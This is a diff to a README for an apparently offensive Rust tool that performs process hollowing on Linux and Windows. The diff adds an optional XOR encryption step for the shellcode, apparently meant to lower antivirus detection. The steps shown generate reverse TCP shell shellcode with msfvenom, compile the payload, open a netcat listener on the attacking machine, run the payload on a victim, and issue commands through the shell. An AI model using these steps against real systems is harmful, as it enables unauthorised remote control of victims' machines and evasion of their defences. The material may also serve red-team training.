@@ -18,23 +18,24 @@ Linux process hollowing functions a little differently. First, the executable cr
 1. [Not shown in GIF] Generate shellcode for the desired end result (for example, use [msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom) to generate a reverse TCP shell shellcode for the target operating system)
 2. [Not shown in GIF] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
 and change the shellcode to the shellcode generated in step 1
-3. [Not shown in GIF] Compile the executable
+3. [Optional] Encrypt the shellcode using [xor_shellcode](https://github.com/kmanc/remote_code_oxidation/blob/master/xor_shellcode) and update the encrypted shellcode value in [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs)  
+4. [Not shown in GIF] Compile the executable, only including `--features encrypted` if you did step 3
 
     #### Build for Linux target
     ```commandline
-    cargo build -p process_hollowing --release
+    cargo build -p process_hollowing [--features encrypted] --release
     ```
 
     #### Build for Windows target
     ```commandline
-    cargo build --target x86_64-pc-windows-gnu -p process_hollowing --release
+    cargo build --target x86_64-pc-windows-gnu -p process_hollowing [--features encrypted] --release
     ```
-4. Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
+5. Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
     ```commandline
     nc -nlvp 4444
     ```   
-5. Execute the payload on the victim machine
-6. Return to the listener and enter desired commands for the victim machine to run
+6. Execute the payload on the victim machine
+7. Return to the listener and enter desired commands for the victim machine to run
 
 
 ## Detection rates
